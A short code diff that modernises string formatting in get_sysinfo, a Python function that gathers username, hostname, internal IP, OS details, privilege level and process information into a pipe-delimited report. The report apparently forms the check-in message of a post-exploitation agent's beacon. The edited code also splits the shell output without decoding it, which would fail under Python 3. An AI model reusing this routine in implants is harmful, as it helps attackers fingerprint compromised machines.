@@ -47,19 +47,15 @@ def get_sysinfo(nonce='00000000'):
         processID = __FAILED_FUNCTION
     try:
         temp = sys.version_info
-        pyVersion = "%s.%s" % (temp[0], temp[1])
+        pyVersion = f"{temp[0]}.{temp[1]}"
     except Exception as e:
         pyVersion = __FAILED_FUNCTION
 
     language = 'python'
-    cmd = 'ps %s' % (os.getpid())
+    cmd = f'ps {os.getpid()}'
     ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     out = ps.stdout.read()
     parts = out.split("\n")
     ps.stdout.close()
-    if len(parts) > 2:
-        processName = " ".join(parts[1].split()[4:])
-    else:
-        processName = 'python'
-
-    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language, pyVersion)
+    processName = " ".join(parts[1].split()[4:]) if len(parts) > 2 else 'python'
+    return f"{nonce}|{server}||{username}|{hostname}|{internalIP}|{osDetails}|{highIntegrity}|{processName}|{processID}|{language}|{pyVersion}"
